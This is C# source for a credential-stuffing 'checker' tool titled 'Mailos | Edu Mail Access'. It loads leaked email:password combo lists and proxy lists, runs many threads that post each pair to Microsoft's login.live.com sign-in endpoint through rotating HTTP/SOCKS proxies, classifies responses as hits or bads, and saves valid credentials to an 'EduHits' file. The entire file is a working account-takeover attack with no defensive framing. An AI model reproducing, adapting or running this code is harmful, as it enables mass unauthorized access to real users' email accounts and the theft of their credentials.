using JawBrute;
using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Template;

namespace Ebay_Checker
{
    class EduMA
    {
        [STAThread]
        public static void Ebay()
        {
            Prsc.EduMA();
            Export.Initialize();
            Console.Title = "Mailos | Edu Mail Access";
        fuck:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                Threads:", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("               > ", Color.SpringGreen);
            try
            {
                Variables.threads = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.WriteLine("Error Parsing Integor...");
                goto fuck;
            }
        fuckme:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [1] HTTP", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [2] SOCKS4", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [3] SOCKS5", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("          > ", Color.SpringGreen);
            string c = Console.ReadLine();
            if (c == "1")
            {
                Variables.proxyprotocol = "HTTP";
            }
            else if (c == "2")
            {
                Variables.proxyprotocol = "SOCKS4";
            }
            else if (c == "3")
            {
                Variables.proxyprotocol = "SOCKS5";
            }
            else
            {
                goto fuckme;
            }
            loadCombos();
        }
        public static void loadCombos()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Combos";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.combos = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.combototal++;
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            loadProxies();
        }
        public static void loadProxies()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Proxies";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.proxies1 = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.proxytotal++;
                            }

                        }
                    }
                }
            }
            catch
            {

            }
            start();
        }
        public static void start()
        {
            Console.Clear();
            ASCII.ASCIII();
            try
            {

                Task.Factory.StartNew(() =>
                {
                    for (; ; )
                    {
                        Variables.cpm = Variables.cpm_aux;
                        Variables.cpm_aux = 0;
                        Colorful.Console.Title = "[Mailos - Edu Mail Access] | Hits: " + Variables.hit + " | Bads: " + Variables.bad + " | Error: " + Variables.error + " | Checked: " + Variables.check + "/" + Variables.combototal + " | CPM: " + Variables.cpm * 60;
                        Thread.Sleep(1000);
                    }
                });

                for (int i = 1; i <= Variables.threads; i++)
                {
                    new Thread(new ThreadStart(CheckAccount)).Start();
                }
            }
            catch
            {

            }
        }
        public static void CheckAccount()
        {
        stat:
            for (; ; )
            {

                while (true)
                {
                    //RANDOM PROXY EVERY REQ
                    string proxy = "";
                    Random r = new Random();
                    proxy = Variables.proxies1[r.Next(Variables.proxies1.Count)];

                    try
                    {

                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            //SPLITTIN COMBOS
                            if (Variables.comboindex >= Variables.combos.Count<string>())
                            {
                                break;
                            }
                            Interlocked.Increment(ref Variables.comboindex);
                            string[] s = Variables.combos[Variables.comboindex].Split(new char[]
                            {
                            ':'
                            });
                            //s[0] - Email  | s[1] - Password
                            try
                            {
                                //PROXY HANDEL
                                if (Variables.proxyprotocol == "HTTP")
                                {
                                    httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS4")
                                {
                                    httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS5")
                                {
                                    httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                                }
                                //REQUESTS - YOU CAN REPLACE WITH COMPILER CODE HERE, USE UR BRAIN PLEASE THANKS`
                                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                                httpRequest.IgnoreProtocolErrors = true;
                                httpRequest.AllowAutoRedirect = true;
                                httpRequest.AddHeader("COOKIE", "MSCC=104.140.14.155-US; uaid=fd1cbab376f144c196df5e9a23b38c46; cltm=nw: 2G-Slow; wlidperf=FR=L&ST=1589791817268; MSPOK=$uuid-f848f7a5-4f3b-4231-adc6-a1c149718e66$uuid-9a62249b-a69e-49c3-9c99-d723a8e568f3$uuid-07a0af7f-2dc6-4bfb-abb8-097ab40240ed$uuid-a6f0d4d6-5bce-449c-96af-3a1d4b7105a8$uuid-dd210cd0-9e62-4b28-b8a8-3580ebc2e571$uuid-f16f2879-7838-419b-ba57-4250c9addf5a$uuid-f3d25d16-bece-47ee-b829-f4b890d3111e");
                                string str = "i13=1&login=" + s[0] + "&loginfmt=" + s[0] + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + s[1] + "&KMSI=on&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DVh*4QvMI6bRTd4YnaA22707UG83ZOsAKbFkML%21OJZVR%21dJXv0H%21Z7aTtmWTiWWVoRJTKBwmJbhP3VG64I9RmYoDGkNjNq4kZI6RIMLkdEowptHxelObKh3aerc4DgRM8lwI7VlZbQX%21UNrsFdafA%21uRNTxhF3FBk5FQ35fplXbyVxOCPq4UZkgra4%21SAh*POXBL9*W7dplWmbNCNZdIW90%24&PPSX=P&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=0&i18=&i19=5892";
                                httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                              new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                                string strResponse = httpRequest.Post("https://login.live.com/ppsecure/post.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https://login.microsoftonline.com/common/federation/oauth2&state=rQIIAX2RO2_TUACFc5vUNFElKujAwNCBiTaJ77WvE1vqkHdIcvMOxlkix7WJnfiBfZOQbMDChCoGho5MqGMREmKFqYDUOb8AMSGEEAMDyR9gOcM5n3Skc-6GYQJKdxCHEZfCOM6paBjnoabGRQ7iuJGGBmdgQVBF7N-I7b1CzPhF2c5e_Pr66d3L39EzEB1MzJme0Fz7HNweUeoFUjKpLqe-nrBNzXcD16CbNPkegCsAvgFwvhUIXAryIi8gkYcCn8IpmGjIbatvFTCxC1RZjlllwbJKV1vW5KLZ6PYoyRPYt3q4bpGFggivLDWedFusIrcoQXVzw9dlAmvd0bhvr718Yd4oVUZ1uTevd4v2aut6IzOlI7QR1zeX-s-tqOH69sBzA3oWfgoanu7cO8m5jqNrNLHBdIeamkpN12n6rqf71NSDY4tg3FUfssKUqEKqthDS-fbjB_VJu-R56TaxZs74vix0cJPMc8Ogs5x4sm4b0xn_KIv8Gm0KIy6TR3keVppl0pl7uUG-klFEuxQEF2FmvZTtOpfh_XWfY54c6bZqTo483zXMiX4VAd8ju2xY2tmJ7YVuhQ5CfyLg9fb6l5X68eaz8ZfSm8yTt5__7oYut5NBj7cOJ9mi02ovqlV9xjnlmt9pyJqXc-c9cZRVDufDapElQusYS_CUAacM84MBz6-FPkT_--Qqto9YxMZZGIfpA4gkCCUu1f8H0&estsfed=1&fci=23523755-3a2b-XMR6b063296488e426db2f4cdc4b592f609&pid=15216", str, "application/x-www-form-urlencoded").ToString();
                                {
                                    if (strResponse.Contains("Your account or password is incorrect") || strResponse.Contains("If you no longer know your password") || strResponse.Contains("This Microsoft account does not exist. Please enter a different account") || strResponse.Contains("Ihr Konto oder Kennwort ist nicht korrekt") || strResponse.Contains("Wenn Sie Ihr Kennwort nicht mehr wissen") || strResponse.Contains("Dieses Microsoft-Konto ist nicht vorhanden. Geben Sie ein anderes Konto ein"))
                                    {
                                        break;
                                    }
                                    else if (strResponse.Contains("JavaScript required to sign in") || strResponse.Contains("JavaScript required for registration") || strResponse.Contains("JavaScript für die Anmeldung erforderlich")) //hit
                                    {
                                        Variables.hit++;
                                        Variables.cpm_aux++;
                                        Variables.check++;
                                        {
                                            Colorful.Console.WriteLine("               [HIT] " + s[0] + ":" + s[1], Color.Green);
                                        }
                                        Export.AsResult("/EduHits", s[0] + ":" + s[1]);

                                    }
                                    else
                                    {
                                        Variables.bad++;
                                        Variables.cpm_aux++;
                                        Variables.check++;
                                    }





                                    {
                                        goto stat;
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                Variables.error++;

                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Variables.error++;
                    }
                }
            }
        }
    }
}